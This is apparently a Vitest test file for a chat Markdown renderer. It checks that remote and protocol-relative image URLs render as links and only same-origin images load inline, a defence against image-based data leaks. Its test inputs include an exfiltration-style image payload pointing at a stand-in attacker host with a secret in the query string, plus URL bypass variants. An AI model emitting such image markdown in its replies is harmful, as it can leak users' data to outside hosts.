import { createElement } from "react";
import { renderToStaticMarkup } from "react-dom/server";
import { describe, expect, it } from "vitest";
import { isInlineImageSrc, Markdown } from "@/components/chat/markdown";

const render = (text: string) => renderToStaticMarkup(createElement(Markdown, { text }));

describe("markdown images", () => {
  it("loads only same-origin paths inline", () => {
    expect(isInlineImageSrc("/api/files/abc")).toBe(true);
    for (const src of ["https://evil.test/p.png", "//evil.test/p.png", "/\\evil.test/p.png", "http://x", "", undefined, "data:image/png;base64,AA"])
      expect(isInlineImageSrc(src), String(src)).toBe(false);
  });

  it("renders a remote image as a link instead of fetching it", () => {
    const html = render("![leak](https://evil.test/p.png?d=secret)");
    expect(html).not.toContain("<img");
    expect(html).toContain('href="https://evil.test/p.png?d=secret"');
    expect(html).toContain(">leak</a>");
  });

  it("renders protocol-relative images as links", () => {
    expect(render("![x](//evil.test/p.png)")).not.toContain("<img");
  });

  it("keeps same-origin images inline", () => {
    expect(render("![chart](/api/files/abc)")).toContain('<img src="/api/files/abc" alt="chart"');
  });
});
